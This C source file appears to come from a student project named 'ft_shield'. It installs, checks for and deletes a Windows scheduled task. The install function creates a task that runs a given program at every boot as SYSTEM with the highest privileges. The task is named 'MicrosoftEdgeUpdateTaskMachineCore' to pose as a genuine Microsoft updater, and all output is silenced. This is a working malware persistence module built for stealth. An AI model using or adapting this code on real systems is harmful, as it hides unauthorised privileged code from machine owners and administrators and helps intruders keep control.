/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   task.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/10/26 14:54:24 by zcadinot          #+#    #+#             */
/*   Updated: 2026/10/26 14:54:26 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_shield.h"
#include <stdlib.h>
#include <stdio.h>

#define TASK_NAME "MicrosoftEdgeUpdateTaskMachineCore"

int task_install(const char *path, const char *arg)
{
    char cmd[4096];

    snprintf(cmd, sizeof(cmd),
        "schtasks /create /sc ONSTART "
        "/tn \"%s\" "
        "/tr \"\\\"%s\\\" %s\" "
        "/ru SYSTEM "
        "/rl HIGHEST "
        "/f >nul 2>&1",
        TASK_NAME, path, arg);

    return (system(cmd) == 0);
}

int persistence_task_detect(void)
{

    char cmd[512];

    snprintf(cmd, sizeof(cmd),
        "schtasks /query /tn \"%s\" >nul 2>&1",
        TASK_NAME);

    return (system(cmd) == 0);
}

int task_uninstall(void)
{
    char cmd[512];

    snprintf(cmd, sizeof(cmd),
        "schtasks /delete /tn \"%s\" /f >nul 2>&1",
        TASK_NAME);

    return (system(cmd) == 0);
}
